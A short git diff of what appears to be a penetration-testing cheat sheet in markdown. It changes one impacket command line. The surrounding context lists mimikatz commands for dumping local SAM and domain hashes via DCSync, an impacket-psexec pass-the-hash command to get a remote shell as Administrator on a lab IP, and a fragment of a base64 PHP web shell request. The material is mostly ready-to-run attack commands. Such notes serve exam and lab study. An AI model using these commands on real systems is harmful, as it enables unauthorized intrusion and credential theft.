@@ -781,7 +781,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
    -  `lsadump::sam`              #dump local SAM hashes
    -  `lsadump::dcsync /domain`   #dump all domain hashes via DCSync 
 4. **impacket** (Windows/AD/SMB/Kerberos)  
-   `kali@kali:~$ /usr/bin/impacket-wmiexec xxx`  
+   `kali@kali:~$ /usr/bin/impacket-xxxx`  
    - **psexec**: Executes commands remotely (get shell) using SMB & admin credentials  
      `Impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`    
    - **wmiexec**: Alternative to psexec if SMB blocked  
